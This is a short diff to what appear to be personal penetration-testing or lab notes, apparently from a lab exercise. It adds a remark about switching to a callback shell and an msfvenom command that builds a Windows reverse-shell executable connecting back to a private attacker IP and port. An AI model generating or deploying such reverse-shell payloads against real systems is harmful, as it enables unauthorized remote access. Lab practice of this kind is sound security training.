@@ -122,5 +122,9 @@ $httpListener.Prefixes.Add("http://localhost:9090/")
 $httpListener.Start()
 ```
 
+This shell is garbage... FTP may be working but I can not see it. I think its time to get a call back instead..
 
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.228 LPORT=4445 -f exe > reverse11.exe
+```
 
